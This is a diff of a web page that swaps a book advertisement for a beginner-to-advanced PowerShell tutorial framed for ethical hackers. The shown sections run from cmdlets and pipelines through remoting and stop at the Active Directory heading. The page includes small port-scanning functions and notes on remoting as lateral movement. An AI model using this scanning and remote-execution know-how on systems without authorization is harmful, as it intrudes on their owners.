+        /* Custom scrollbar */
+        ::-webkit-scrollbar { width: 8px; height: 8px; }
+        ::-webkit-scrollbar-track { background: #05080e; }
+        ::-webkit-scrollbar-thumb { background: #1a2a2a; border-radius: 20px; }
+        ::-webkit-scrollbar-thumb:hover { background: #00ff8833; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <!-- ===== HEADER ===== -->
+    <header class="page-header">
+        <div class="badge">
+            <span class="dot"></span>
+            CYBERSUME · COMPLETE GUIDE
         </div>
-
-        <!-- ===== INTRODUCTION ===== -->
-        <p>
-            In today's technology-driven world, automation has become an essential skill for IT professionals, system administrators, DevOps engineers, and even curious beginners. Repetitive manual tasks consume valuable time, increase the risk of errors, and make managing modern Windows environments more difficult than ever. That's where PowerShell comes in.
-        </p>
-        <p>
-            PowerShell is Microsoft's powerful command-line shell and scripting language designed to simplify system administration and automate complex tasks. Whether you're managing hundreds of computers, configuring cloud services, organizing files, or deploying applications, PowerShell provides the tools to work smarter—not harder.
-        </p>
-        <p>
-            If you've ever wanted to learn PowerShell but didn't know where to begin, <strong>PowerShell: The Complete Guide from Beginner to Advanced</strong> by <strong>Z B Sume</strong> is designed specifically for you.
+        <h1>PowerShell <span class="highlight">Automation</span></h1>
+        <p class="subtitle">
+            The complete, in-depth guide to PowerShell — from cmdlets and pipelines to advanced scripting. 
+            The most powerful automation tool for Windows administrators, red teamers, and blue teamers alike.
         </p>
 
-        <!-- ===== FEATURED IMAGES WITH AMAZON LINK ===== -->
-        <div class="featured-box">
-            <div class="featured-image">
-                <div class="image-group">
-                    <a href="https://www.amazon.com/dp/B0H94TBYJC" target="_blank" rel="noopener">
-                        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgyo0JOOFnej7DmGYxjHwiX6xqqN8Wb42CMUCuJJXQsp2zTRRgEAjwbh2b0uqwWbvXy1LuTEGtyV5AHrjxcnKKyV1hqqMecKEnLpW-3AQmvOcLjpFh1uIsg6xvjKjBhqJPHiFq2e3oSTsS-mOJxk0mT9xyzsquA-yRh10SEfW2sPiq9XuOCMVeYtaS43IEC/s320/image.png" 
-                             alt="PowerShell Complete Guide Book"/>
-                    </a>
-                    <a href="https://www.amazon.com/dp/B0H94TBYJC" target="_blank" rel="noopener">
-                        
-                    </a>
-                </div>
-            </div>
-            <div class="featured-cta">
-                <p>📚 <strong style="color:#00ff88;">Get Your Copy Today!</strong></p>
-                <a class="main-link" href="https://www.amazon.com/dp/B0H94TBYJC" target="_blank" rel="noopener">
-                    🛒 Buy Now on Amazon
-                </a>
-                <p class="small-note">Click on the book image or button above</p>
-            </div>
+        <div class="meta-bar">
+            <div class="meta-item"><span class="ico">📖</span> <span>Reading time: <strong>25 min</strong></span></div>
+            <div class="meta-item"><span class="ico">🪟</span> <span>Category: <strong>Windows</strong></span></div>
+            <div class="meta-item"><span class="ico">🛡️</span> <span>Level: <strong>Beginner → Advanced</strong></span></div>
+            <div class="meta-item"><span class="ico">⚡</span> <span>Updated: <strong>2025</strong></span></div>
         </div>
+    </header>
 
-        <!-- ===== WHY LEARN ===== -->
-        <h2 id="why">💡 Why Learn PowerShell?</h2>
+    <!-- ===== TABLE OF CONTENTS ===== -->
+    <nav class="toc">
+        <div class="toc-title">📑 Table of Contents</div>
+        <ul class="toc-list">
+            <li><a href="#intro"><span class="num">01</span> Introduction</a></li>
+            <li><a href="#why"><span class="num">02</span> Why PowerShell</a></li>
+            <li><a href="#basics"><span class="num">03</span> PS Fundamentals</a></li>
+            <li><a href="#cmdlets"><span class="num">04</span> Cmdlets &amp; Objects</a></li>
+            <li><a href="#pipeline"><span class="num">05</span> Pipeline &amp; Filtering</a></li>
+            <li><a href="#variables"><span class="num">06</span> Variables &amp; Arrays</a></li>
+            <li><a href="#control"><span class="num">07</span> Control Flow</a></li>
+            <li><a href="#functions"><span class="num">08</span> Functions &amp; Modules</a></li>
+            <li><a href="#files"><span class="num">09</span> File Operations</a></li>
+            <li><a href="#remoting"><span class="num">10</span> Remote Management</a></li>
+            <li><a href="#ad"><span class="num">11</span> Active Directory</a></li>
+            <li><a href="#security"><span class="num">12</span> Offensive PowerShell</a></li>
+            <li><a href="#defense"><span class="num">13</span> Defensive PowerShell</a></li>
+            <li><a href="#best"><span class="num">14</span> Best Practices</a></li>
+            <li><a href="#legal"><span class="num">15</span> Legal &amp; Ethics</a></li>
+            <li><a href="#conclusion"><span class="num">16</span> Conclusion</a></li>
+        </ul>
+    </nav>
+
+    <!-- ===== 01 INTRO ===== -->
+    <section class="section" id="intro">
+        <span class="section-number">01 · INTRODUCTION</span>
+        <h2 class="section-title">
+            <span class="icon">🪟</span>
+            What Is PowerShell?
+        </h2>
         <p>
-            PowerShell is more than a command-line interface. It is a complete automation platform that allows users to interact with Windows, Microsoft 365, Azure, Active Directory, and countless other technologies. Unlike traditional command prompts, PowerShell works with objects rather than plain text, making it more powerful, flexible, and efficient.
+            <strong>PowerShell</strong> is Microsoft's task automation and configuration management framework. First released in 2006, it combines a <em>command-line shell</em> with a <em>scripting language</em> built on the .NET framework. Unlike traditional shells (CMD, Bash), PowerShell works with <strong>objects</strong>, not just text.
         </p>
         <p>
-            <strong>Learning PowerShell can help you:</strong>
+            There are two main versions:
         </p>
         <ul>
-            <li>Automate repetitive administrative tasks</li>
-            <li>Save hours of manual work every week</li>
-            <li>Manage Windows systems more efficiently</li>
-            <li>Improve troubleshooting and reporting</li>
-            <li>Enhance your career opportunities in IT and DevOps</li>
-            <li>Build reusable scripts for everyday operations</li>
+            <li><strong>Windows PowerShell (5.1)</strong> — Bundled with Windows, uses .NET Framework</li>
+            <li><strong>PowerShell 7+ (Core)</strong> — Cross-platform (Windows, Linux, macOS), uses .NET Core</li>
         </ul>
         <p>
-            As organizations continue to adopt cloud technologies and infrastructure automation, PowerShell remains one of the most valuable skills for IT professionals.
+            For ethical hackers, PowerShell is a <strong>double-edged sword</strong>. It's the most powerful tool for Windows administration — and also the most abused tool in modern cyber attacks. Red teamers use it for post-exploitation; blue teamers use it to hunt threats. If you work with Windows, you <em>must</em> know PowerShell.
         </p>
+        <div class="callout info">
+            <strong>💡 Note:</strong> PowerShell is pre-installed on every modern Windows system. On Kali Linux, you can install PowerShell 7 for cross-platform scripting.
+        </div>
+    </section>
 
-        <hr/>
+    <!-- ===== 02 WHY ===== -->
+    <section class="section" id="why">
+        <span class="section-number">02 · WHY POWERSHELL</span>
+        <h2 class="section-title">
+            <span class="icon">💡</span>
+            Why Learn PowerShell?
+        </h2>
+        <div class="use-grid">
+            <div class="use-card">
+                <span class="use-icon">⚙️</span>
+                <h4>Windows Automation</h4>
+                <p>Automate every Windows task — backups, deployments, user management.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🔧</span>
+                <h4>Object-Oriented</h4>
+                <p>Work with objects, not text. Filter, sort, and manipulate structured data.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🌐</span>
+                <h4>Remote Management</h4>
+                <p>Manage thousands of machines via WinRM and PowerShell Remoting.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">💥</span>
+                <h4>Red Team Favorite</h4>
+                <p>Post-exploitation, lateral movement, and C2 frameworks use PowerShell.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🛡️</span>
+                <h4>Blue Team Essential</h4>
+                <p>Hunt threats, parse logs, and respond to incidents with PS scripts.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">☁️</span>
+                <h4>Azure &amp; M365</h4>
+                <p>Manage cloud infrastructure and Microsoft 365 via PowerShell.</p>
+            </div>
+        </div>
+        <div class="callout">
+            <strong>🔑 Key Insight:</strong> PowerShell is <em>fileless</em> — it runs in memory without touching disk. This is why it's both loved by attackers (evasion) and feared by defenders (hard to detect).
+        </div>
+    </section>
 
-        <!-- ===== WHAT YOU'LL LEARN ===== -->
-        <h2 id="learn">📖 What You'll Learn in This Book</h2>
-        <p>
-            This book follows a practical, step-by-step approach that makes learning simple, even if you've never written a script before.
-        </p>
-        <p>
-            <strong>Inside, you'll discover how to:</strong>
-        </p>
-        <ul class="two-col-list">
-            <li>Understand PowerShell fundamentals</li>
-            <li>Use cmdlets and pipelines effectively</li>
-            <li>Work with variables, arrays, and functions</li>
-            <li>Create reusable automation scripts</li>
-            <li>Handle errors like a professional</li>
-            <li>Manage files, folders, services, and processes</li>
-            <li>Automate Active Directory administration</li>
-            <li>Use PowerShell Remoting for remote management</li>
-            <li>Connect with REST APIs and web services</li>
-            <li>Work with JSON, XML, and CSV data</li>
-            <li>Manage Microsoft Azure and Microsoft 365</li>
-            <li>Apply scripting best practices for production environments</li>
-        </ul>
-        <p>
-            Each chapter includes practical examples that you can immediately apply in real-world situations.
-        </p>
+    <!-- ===== 03 BASICS ===== -->
+    <section class="section" id="basics">
+        <span class="section-number">03 · FUNDAMENTALS</span>
+        <h2 class="section-title">
+            <span class="icon">📚</span>
+            PowerShell Fundamentals
+        </h2>
 
-        <hr/>
+        <h3>Opening PowerShell</h3>
+        <p>Press <code>Win + X</code> and select "Windows PowerShell" or "Terminal". For admin tasks, choose "Windows PowerShell (Admin)".</p>
 
-        <!-- ===== DESIGNED FOR ===== -->
-        <h2 id="designed">🎯 Designed for Beginners and Professionals</h2>
-        <p>
-            One of the biggest challenges when learning PowerShell is finding a resource that explains concepts clearly without assuming prior scripting knowledge. This guide bridges that gap by starting with the fundamentals before progressing to advanced scripting techniques.
-        </p>
-        <p>
-            Whether you're a student exploring automation, an IT support technician, a Windows administrator, or a DevOps engineer, this book provides a structured learning path that builds confidence with every chapter.
-        </p>
+        <h3>Your First Commands</h3>
+        <div class="code-block" data-lang="powershell">
+<code><span class="cmt"># Print text</span>
+<span class="fn">Write-Host</span> <span class="str">"Hello, Ethical Hacker!"</span>
 
-        <!-- ===== BOOK HIGHLIGHT ===== -->
-        <div class="book-highlight">
-            <p class="highlight-title">⭐ From Zero to PowerShell Hero</p>
-            <p style="color:#b0b8c8;">No prior scripting experience required — Start from the basics and build real-world skills!</p>
+<span class="cmt"># Get current date</span>
+<span class="fn">Get-Date</span>
+
+<span class="cmt"># List files</span>
+<span class="fn">Get-ChildItem</span>
+
+<span class="cmt"># Get current user</span>
+<span class="fn">whoami</span></code>
         </div>
 
-        <hr/>
-
-        <!-- ===== PRACTICAL PROJECTS ===== -->
-        <h2 id="projects">🛠️ Practical Learning Through Real Projects</h2>
-        <p>
-            Reading about scripting is helpful, but writing scripts is where real learning happens. That's why this book emphasizes hands-on practice with practical projects based on everyday administrative tasks.
-        </p>
-        <p>
-            You'll learn how to automate system maintenance, generate reports, manage users, schedule tasks, monitor services, process files, and streamline routine operations. These exercises reinforce key concepts while helping you build a portfolio of useful scripts.
-        </p>
-
-        <hr/>
-
-        <!-- ===== WHO SHOULD READ ===== -->
-        <h2 id="readers">👥 Who Should Read This Book?</h2>
-        <p>
-            <strong>This guide is ideal for:</strong>
-        </p>
-        <ul>
-            <li>Beginners learning PowerShell for the first time</li>
-            <li>Windows administrators</li>
-            <li>IT support professionals</li>
-            <li>Help desk engineers</li>
-            <li>DevOps engineers</li>
-            <li>Cloud administrators</li>
-            <li>Cybersecurity professionals</li>
-            <li>Students preparing for IT careers</li>
-        </ul>
-        <p>
-            If your work involves Windows systems or Microsoft technologies, PowerShell is a skill worth investing in.
-        </p>
-
-        <hr/>
-
-        <!-- ===== AUTHOR ===== -->
-        <div class="author-box">
-            <p class="author-name">✍️ Z B Sume</p>
-            <p style="color:#b0b8c8;">Author of PowerShell: The Complete Guide from Beginner to Advanced</p>
-            <p style="color:#6a7290;font-size:14px;">Helping thousands of IT professionals master automation</p>
+        <h3>Cmdlet Naming Convention</h3>
+        <p>PowerShell cmdlets follow a <strong>Verb-Noun</strong> pattern, making them self-documenting:</p>
+        <div class="table-wrap">
+            <table>
+                <thead>
+                    <tr><th>Verb</th><th>Purpose</th><th>Example</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td><code>Get</code></td><td>Retrieve data</td><td><code>Get-Process</code></td></tr>
+                    <tr><td><code>Set</code></td><td>Modify data</td><td><code>Set-Item</code></td></tr>
+                    <tr><td><code>New</code></td><td>Create new</td><td><code>New-Item</code></td></tr>
+                    <tr><td><code>Remove</code></td><td>Delete</td><td><code>Remove-Item</code></td></tr>
+                    <tr><td><code>Start</code></td><td>Start service/process</td><td><code>Start-Process</code></td></tr>
+                    <tr><td><code>Stop</code></td><td>Stop service/process</td><td><code>Stop-Process</code></td></tr>
+                    <tr><td><code>Invoke</code></td><td>Execute</td><td><code>Invoke-Command</code></td></tr>
+                </tbody>
+            </table>
         </div>
 
-        <hr/>
+        <h3>Getting Help</h3>
+        <div class="code-block" data-lang="powershell">
+<code><span class="cmt"># Get help for a cmdlet</span>
+<span class="fn">Get-Help</span> Get-Process
 
-        <!-- ===== START AUTOMATING ===== -->
-        <h2 id="start">🚀 Start Automating Today</h2>
+<span class="cmt"># Show examples only</span>
+<span class="fn">Get-Help</span> Get-Process -Examples
+
+<span class="cmt"># Update help documentation</span>
+<span class="fn">Update-Help</span>
+
+<span class="cmt"># Find commands by keyword</span>
+<span class="fn">Get-Command</span> *service*
+
+<span class="cmt"># Show cmdlet syntax</span>
+<span class="fn">Get-Command</span> Get-Process -Syntax</code>
+        </div>
+    </section>
+
+    <!-- ===== 04 CMDLETS ===== -->
+    <section class="section" id="cmdlets">
+        <span class="section-number">04 · CMDLETS &amp; OBJECTS</span>
+        <h2 class="section-title">
+            <span class="icon">🔧</span>
+            Cmdlets &amp; Objects
+        </h2>
         <p>
-            Automation is no longer a luxury—it's an essential part of modern IT. Learning PowerShell can help you work faster, reduce repetitive tasks, and improve your technical expertise.
-        </p>
-        <p>
-            <strong>PowerShell: The Complete Guide from Beginner to Advanced</strong> by <strong>Z B Sume</strong> offers a practical roadmap to mastering one of Microsoft's most powerful technologies. With clear explanations, hands-on examples, and real-world projects, you'll gain the confidence to automate tasks, manage systems efficiently, and take your IT skills to the next level.
+            PowerShell is object-oriented. When you run a command, you get back <strong>objects</strong> with properties and methods — not just text. This is a game-changer for automation.
         </p>
 
-        <!-- ===== FINAL CTA ===== -->
-        <div class="book-highlight" style="border-color:#ffcc00;background:linear-gradient(135deg,rgba(255,204,0,0.05),rgba(0,255,136,0.05));">
-            <p class="highlight-title" style="color:#ffcc00;">🔥 Ready to Master PowerShell?</p>
-            <p style="color:#b0b8c8;font-size:16px;">
-                If you're ready to boost your productivity and build a valuable automation skill, this book is the perfect place to begin.
-            </p>
-            <br/>
-            <a class="main-link" href="https://www.amazon.com/dp/B0H94TBYJC" target="_blank" rel="noopener" 
-               style="display:inline-block;padding:15px 42px;background:linear-gradient(135deg,#ffcc00,#ff9900);color:#000000 !important;border-radius:10px;font-weight:700;font-size:16px;text-decoration:none;transition:all 0.3s ease;letter-spacing:0.5px;">
-                🛒 Buy Now on Amazon
-            </a>
-            <p class="small-note" style="color:#6a7290 !important;font-size:13px;margin-top:12px;">
-                Start your automation journey today — Get your copy now!
-            </p>
+        <div class="code-block" data-lang="powershell">
+<code><span class="cmt"># Get processes (returns objects)</span>
+<span class="var">$processes</span> = <span class="fn">Get-Process</span>
+
+<span class="cmt"># Access properties</span>
+<span class="var">$processes</span> | <span class="fn">Select-Object</span> Name, CPU, WorkingSet
+
+<span class="cmt"># Filter by property</span>
+<span class="var">$processes</span> | <span class="fn">Where-Object</span> { <span class="var">$_</span>.CPU -gt <span class="num">100</span> }
+
+<span class="cmt"># Sort objects</span>
+<span class="var">$processes</span> | <span class="fn">Sort-Object</span> CPU -Descending | <span class="fn">Select-Object</span> -First <span class="num">10</span>
+
+<span class="cmt"># Get object type</span>
+<span class="var">$processes</span>[<span class="num">0</span>].<span class="fn">GetType</span>()
+
+<span class="cmt"># See all properties and methods</span>
+<span class="var">$processes</span>[<span class="num">0</span>] | <span class="fn">Get-Member</span></code>
+        </div>
+    </section>
+
+    <!-- ===== 05 PIPELINE ===== -->
+    <section class="section" id="pipeline">
+        <span class="section-number">05 · PIPELINE</span>
+        <h2 class="section-title">
+            <span class="icon">🔗</span>
+            Pipeline &amp; Data Filtering
+        </h2>
+        <p>
+            The <strong>pipeline</strong> (<code>|</code>) passes objects from one cmdlet to the next. Unlike Bash (where you pass text), PowerShell passes rich objects with properties intact.
+        </p>
+
+        <h3>Essential Pipeline Cmdlets</h3>
+        <div class="code-block" data-lang="powershell">
+<code><span class="cmt"># Filter — only matching objects pass through</span>
+<span class="fn">Get-Process</span> | <span class="fn">Where-Object</span> { <span class="var">$_</span>.Name -like <span class="str">"chrome*"</span> }
+
+<span class="cmt"># Select specific properties</span>
+<span class="fn">Get-Process</span> | <span class="fn">Select-Object</span> Name, Id, CPU
+
+<span class="cmt"># Sort results</span>
+<span class="fn">Get-Process</span> | <span class="fn">Sort-Object</span> CPU -Descending
+
+<span class="cmt"># Group by property</span>
+<span class="fn">Get-Process</span> | <span class="fn">Group-Object</span> Company
+
+<span class="cmt"># Measure count, sum, average</span>
+<span class="fn">Get-Process</span> | <span class="fn">Measure-Object</span> CPU -Sum -Average
+
+<span class="cmt"># Format output</span>
+<span class="fn">Get-Process</span> | <span class="fn">Format-Table</span> Name, CPU -AutoSize
+
+<span class="cmt"># Export to CSV</span>
+<span class="fn">Get-Process</span> | <span class="fn">Export-Csv</span> processes.csv -NoTypeInformation</code>
         </div>
 
-        <hr/>
+        <h3>Real-World Pipeline Examples</h3>
+        <div class="code-block" data-lang="powershell">
+<code><span class="cmt"># Top 5 memory-consuming processes</span>
+<span class="fn">Get-Process</span> | <span class="fn">Sort-Object</span> WorkingSet -Descending |
+    <span class="fn">Select-Object</span> -First <span class="num">5</span> Name, @{N=<span class="str">'RAM(MB)'</span>;E={[math]::Round(<span class="var">$_</span>.WorkingSet/<span class="num">1MB</span>,<span class="num">2</span>)}}
 
-        <!-- ===== SHARE SECTION ===== -->
-        <div class="share-section">
-            <p>📤 Share this book recommendation with your network</p>
-            <div class="share-buttons">
-                <a href="#" onclick="window.open('https://twitter.com/intent/tweet?text=Master%20Windows%20Automation%20with%20PowerShell%20-%20The%20Complete%20Guide%20from%20Beginner%20to%20Advanced!%20%23PowerShell%20%23Automation%20%23IT','_blank');return false;">
-                    🐦 Twitter
-                </a>
-                <a href="#" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(window.location.href),'_blank');return false;">
-                    📘 Facebook
-                </a>
-                <a href="#" onclick="window.open('https://www.linkedin.com/sharing/share-offsite/?url='+encodeURIComponent(window.location.href),'_blank');return false;">
-                    💼 LinkedIn
-                </a>
+<span class="cmt"># Find stopped services set to auto-start</span>
+<span class="fn">Get-Service</span> | <span class="fn">Where-Object</span> { <span class="var">$_</span>.StartType -eq <span class="str">'Automatic'</span> -and <span class="var">$_</span>.Status -eq <span class="str">'Stopped'</span> }
+
+<span class="cmt"># List files modified in last 24 hours</span>
+<span class="fn">Get-ChildItem</span> -Recurse | <span class="fn">Where-Object</span> {
+    <span class="var">$_</span>.LastWriteTime -gt (<span class="fn">Get-Date</span>).<span class="fn">AddDays</span>(-<span class="num">1</span>)
+}</code>
+        </div>
+    </section>
+
+    <!-- ===== 06 VARIABLES ===== -->
+    <section class="section" id="variables">
+        <span class="section-number">06 · VARIABLES</span>
+        <h2 class="section-title">
+            <span class="icon">📦</span>
+            Variables, Arrays &amp; Hashtables
+        </h2>
+
+        <div class="code-block" data-lang="powershell">
+<code><span class="cmt"># Variables (start with $)</span>
+<span class="var">$target</span> = <span class="str">"192.168.1.1"</span>
+<span class="var">$port</span> = <span class="num">22</span>
+<span class="var">$is_open</span> = <span class="var">$true</span>
+
+<span class="cmt"># String interpolation</span>
+<span class="fn">Write-Host</span> <span class="str">"Scanning <span class="var">$target</span> on port <span class="var">$port</span>"</span>
+
+<span class="cmt"># Arrays</span>
+<span class="var">$ports</span> = <span class="num">21</span>, <span class="num">22</span>, <span class="num">80</span>, <span class="num">443</span>
+<span class="var">$ports</span> += <span class="num">8080</span>
+
+<span class="cmt"># Loop through array</span>
+<span class="kw">foreach</span> (<span class="var">$p</span> <span class="kw">in</span> <span class="var">$ports</span>) {
+    <span class="fn">Write-Host</span> <span class="str">"Port: <span class="var">$p</span>"</span>
+}
+
+<span class="cmt"># Hashtables (key-value pairs)</span>
+<span class="var">$target_info</span> = @{
+    IP = <span class="str">"192.168.1.1"</span>
+    Port = <span class="num">22</span>
+    OS = <span class="str">"Windows"</span>
+}
+
+<span class="fn">Write-Host</span> <span class="var">$target_info</span>.IP
+<span class="var">$target_info</span>[<span class="str">"Port"</span>]
+
+<span class="cmt"># Custom objects (PSCustomObject)</span>
+<span class="var">$result</span> = [PSCustomObject]@{
+    Target = <span class="str">"192.168.1.1"</span>
+    Status = <span class="str">"Online"</span>
+    Ports = <span class="var">$ports</span>
+}</code>
+        </div>
+    </section>
+
+    <!-- ===== 07 CONTROL ===== -->
+    <section class="section" id="control">
+        <span class="section-number">07 · CONTROL FLOW</span>
+        <h2 class="section-title">
+            <span class="icon">🔀</span>
+            Control Flow
+        </h2>
+
+        <div class="code-block" data-lang="powershell">
+<code><span class="cmt"># If / ElseIf / Else</span>
+<span class="var">$port</span> = <span class="num">443</span>
+
+<span class="kw">if</span> (<span class="var">$port</span> -eq <span class="num">22</span>) {
+    <span class="fn">Write-Host</span> <span class="str">"SSH"</span>
+} <span class="kw">elseif</span> (<span class="var">$port</span> -eq <span class="num">443</span>) {
+    <span class="fn">Write-Host</span> <span class="str">"HTTPS"</span>
+} <span class="kw">else</span> {
+    <span class="fn">Write-Host</span> <span class="str">"Unknown"</span>
+}
+
+<span class="cmt"># Switch</span>
+<span class="kw">switch</span> (<span class="var">$port</span>) {
+    <span class="num">22</span>  { <span class="fn">Write-Host</span> <span class="str">"SSH"</span> }
+    <span class="num">80</span>  { <span class="fn">Write-Host</span> <span class="str">"HTTP"</span> }
+    <span class="num">443</span> { <span class="fn">Write-Host</span> <span class="str">"HTTPS"</span> }
+    <span class="kw">default</span> { <span class="fn">Write-Host</span> <span class="str">"Unknown"</span> }
+}
+
+<span class="cmt"># For loop</span>
+<span class="kw">for</span> (<span class="var">$i</span> = <span class="num">1</span>; <span class="var">$i</span> -le <span class="num">5</span>; <span class="var">$i</span>++) {
+    <span class="fn">Write-Host</span> <span class="var">$i</span>
+}
+
+<span class="cmt"># While loop</span>
+<span class="var">$n</span> = <span class="num">0</span>
+<span class="kw">while</span> (<span class="var">$n</span> -lt <span class="num">5</span>) {
+    <span class="fn">Write-Host</span> <span class="var">$n</span>
+    <span class="var">$n</span>++
+}
+
+<span class="cmt"># ForEach-Object (pipeline version)</span>
+<span class="num">1</span>..<span class="num">5</span> | <span class="fn">ForEach-Object</span> { <span class="fn">Write-Host</span> <span class="var">$_</span> }</code>
+        </div>
+
+        <h3>Comparison Operators</h3>
+        <div class="table-wrap">
+            <table>
+                <thead>
+                    <tr><th>Operator</th><th>Meaning</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td><code>-eq</code></td><td>Equal</td></tr>
+                    <tr><td><code>-ne</code></td><td>Not equal</td></tr>
+                    <tr><td><code>-gt / -ge</code></td><td>Greater than / or equal</td></tr>
+                    <tr><td><code>-lt / -le</code></td><td>Less than / or equal</td></tr>
+                    <tr><td><code>-like</code></td><td>Wildcard match</td></tr>
+                    <tr><td><code>-match</code></td><td>Regex match</td></tr>
+                    <tr><td><code>-contains</code></td><td>Collection contains</td></tr>
+                    <tr><td><code>-in</code></td><td>Value in collection</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </section>
+
+    <!-- ===== 08 FUNCTIONS ===== -->
+    <section class="section" id="functions">
+        <span class="section-number">08 · FUNCTIONS &amp; MODULES</span>
+        <h2 class="section-title">
+            <span class="icon">🧩</span>
+            Functions, Scripts &amp; Modules
+        </h2>
+
+        <h3>Defining Functions</h3>
+        <div class="code-block" data-lang="powershell">
+<code><span class="kw">function</span> <span class="fn">Test-Port</span> {
+    <span class="kw">param</span>(
+        [Parameter(Mandatory=<span class="var">$true</span>)]
+        [string]<span class="var">$ComputerName</span>,
+
+        [int]<span class="var">$Port</span> = <span class="num">22</span>
+    )
+
+    <span class="kw">try</span> {
+        <span class="var">$tcp</span> = <span class="fn">New-Object</span> System.Net.Sockets.TcpClient
+        <span class="var">$tcp</span>.<span class="fn">Connect</span>(<span class="var">$ComputerName</span>, <span class="var">$Port</span>)
+        <span class="var">$tcp</span>.<span class="fn">Close</span>()
+        <span class="kw">return</span> <span class="var">$true</span>
+    } <span class="kw">catch</span> {
+        <span class="kw">return</span> <span class="var">$false</span>
+    }
+}
+
+<span class="cmt"># Usage</span>
+<span class="fn">Test-Port</span> -ComputerName <span class="str">"192.168.1.1"</span> -Port <span class="num">443</span></code>
+        </div>
+
+        <h3>Advanced Functions with CmdletBinding</h3>
+        <div class="code-block" data-lang="powershell">
+<code><span class="kw">function</span> <span class="fn">Get-OpenPort</span> {
+    [CmdletBinding()]
+    <span class="kw">param</span>(
+        [Parameter(Mandatory=<span class="var">$true</span>, ValueFromPipeline=<span class="var">$true</span>)]
+        [string]<span class="var">$ComputerName</span>,
+
+        [int[]]<span class="var">$Ports</span> = @(<span class="num">21</span>, <span class="num">22</span>, <span class="num">80</span>, <span class="num">443</span>)
+    )
+
+    <span class="kw">process</span> {
+        <span class="kw">foreach</span> (<span class="var">$port</span> <span class="kw">in</span> <span class="var">$Ports</span>) {
+            <span class="var">$result</span> = <span class="fn">Test-NetConnection</span> -ComputerName <span class="var">$ComputerName</span> `
+                -Port <span class="var">$port</span> -WarningAction SilentlyContinue
+
+            <span class="kw">if</span> (<span class="var">$result</span>.TcpTestSucceeded) {
+                [PSCustomObject]@{
+                    Host = <span class="var">$ComputerName</span>
+                    Port = <span class="var">$port</span>
+                    Status = <span class="str">"Open"</span>
+                }
+            }
+        }
+    }
+}
+
+<span class="cmt"># Usage</span>
+<span class="fn">Get-OpenPort</span> -ComputerName <span class="str">"192.168.1.1"</span></code>
+        </div>
+
+        <h3>Creating Modules</h3>
+        <div class="code-block" data-lang="powershell">
+<code><span class="cmt"># Save functions in MyTools.psm1, then:</span>
+<span class="fn">Import-Module</span> .\MyTools.psm1
+
+<span class="cmt"># List imported modules</span>
+<span class="fn">Get-Module</span>
+
+<span class="cmt"># List commands in a module</span>
+<span class="fn">Get-Command</span> -Module MyTools</code>
+        </div>
+    </section>
+
+    <!-- ===== 09 FILES ===== -->
+    <section class="section" id="files">
+        <span class="section-number">09 · FILE OPERATIONS</span>
+        <h2 class="section-title">
+            <span class="icon">📁</span>
+            File &amp; Directory Operations
+        </h2>
+
+        <div class="code-block" data-lang="powershell">
+<code><span class="cmt"># Navigate</span>
+<span class="fn">Set-Location</span> C:\Users
+<span class="fn">Get-Location</span>
+<span class="fn">Get-ChildItem</span> -Force
+
+<span class="cmt"># Create / remove</span>
+<span class="fn">New-Item</span> -ItemType Directory -Name MyFolder
+<span class="fn">New-Item</span> -ItemType File -Name notes.txt
+<span class="fn">Remove-Item</span> notes.txt
+<span class="fn">Remove-Item</span> MyFolder -Recurse
+
+<span class="cmt"># Copy / move</span>
+<span class="fn">Copy-Item</span> file.txt C:\Backup\
+<span class="fn">Move-Item</span> file.txt C:\Archive\
+
+<span class="cmt"># Read content</span>
+<span class="fn">Get-Content</span> file.txt
+<span class="fn">Get-Content</span> file.txt -Tail <span class="num">10</span>
+
+<span class="cmt"># Write content</span>
+<span class="str">"Hello"</span> | <span class="fn">Out-File</span> output.txt
+<span class="fn">Add-Content</span> output.txt <span class="str">"More data"</span>
+<span class="fn">Set-Content</span> output.txt <span class="str">"Overwrites file"</span>
+
+<span class="cmt"># Search inside files</span>
+<span class="fn">Select-String</span> -Path *.log -Pattern <span class="str">"error"</span>
+
+<span class="cmt"># Copy wordlist of targets</span>
+<span class="fn">Get-Content</span> targets.txt | <span class="fn">ForEach-Object</span> {
+    <span class="fn">Test-Connection</span> -Count <span class="num">1</span> -Quiet <span class="var">$_</span>
+}</code>
+        </div>
+    </section>
+
+    <!-- ===== 10 REMOTING ===== -->
+    <section class="section" id="remoting">
+        <span class="section-number">10 · REMOTE MANAGEMENT</span>
+        <h2 class="section-title">
+            <span class="icon">🌐</span>
+            PowerShell Remoting
+        </h2>
+        <p>
+            <strong>PowerShell Remoting</strong> lets you run commands on remote machines over WinRM (port 5985/5986). Essential for managing fleets of Windows servers — and a common technique in lateral movement.
+        </p>
+
+        <div class="code-block" data-lang="powershell">
+<code><span class="cmt"># Enable remoting on local machine (admin)</span>
+<span class="fn">Enable-PSRemoting</span> -Force
+
+<span class="cmt"># One-to-one interactive session</span>
+<span class="fn">Enter-PSSession</span> -ComputerName DC01
+
+<span class="cmt"># One-to-many (run on multiple machines)</span>
+<span class="fn">Invoke-Command</span> -ComputerName DC01, DC02, WEB01 `
+    -ScriptBlock { <span class="fn">Get-Service</span> WinRM }
+
+<span class="cmt"># Persistent session</span>
+<span class="var">$s</span> = <span class="fn">New-PSSession</span> -ComputerName DC01
+<span class="fn">Invoke-Command</span> -Session <span class="var">$s</span> -ScriptBlock { <span class="fn">whoami</span> }
+<span class="fn">Remove-PSSession</span> <span class="var">$s</span>
+
+<span class="cmt"># With credentials</span>
+<span class="var">$cred</span> = <span class="fn">Get-Credential</span>
+<span class="fn">Invoke-Command</span> -ComputerName DC01 -Credential <span class="var">$cred</span> `
+    -ScriptBlock { <span class="fn">Get-Process</span> }</code>
+        </div>
+
+        <div class="callout info">
+            <strong>💡 Note:</strong> PowerShell Remoting requires WinRM to be enabled. Modern Windows Server 2012+ has it enabled by default.
+        </div>
+    </section>
+
+    <!-- ===== 11 AD ===== -->
+    <section class="section" id="ad">
+        <span class="section-number">11 · ACTIVE DIRECTORY</span>
+        <h2 class="section-title">
+            <span class="icon">🏢</span>
